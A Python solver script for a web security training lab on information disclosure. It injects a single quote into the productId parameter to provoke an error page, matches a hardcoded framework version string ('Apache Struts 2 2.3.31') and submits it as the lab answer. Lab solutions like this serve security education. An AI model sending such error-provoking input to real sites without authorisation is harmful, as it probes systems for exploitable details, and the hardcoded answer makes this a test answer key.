##############################################################################
#
# Lab: Information disclosure in error messages
#
# Hack Steps: 
#      1. Inject a single quote in the productId parameter to cause an error
#      2. Extract the framework name
#      3. Submit the solution
#
##############################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0aac009c04b02650818807e0006b00ce.web-security-academy.net"

def main():
    print("⦗1⦘ Injecting a single quote in the productId parameter to cause an error.. ", end="", flush=True)
    
    product = fetch("/product?productId=4'")  

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the framework name.. ", end="", flush=True)
    
    framework_name = re.findall("Apache Struts 2 2.3.31", product.text)[0]  

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + framework_name) 
    print(Fore.WHITE + "⦗3⦘ Submitting the solution.. ", end="", flush=True)

    data = { "answer": framework_name }
    post_data("/submitsolution", data)  

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path):
    try:  
        return requests.get(f"{LAB_URL}{path}")
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()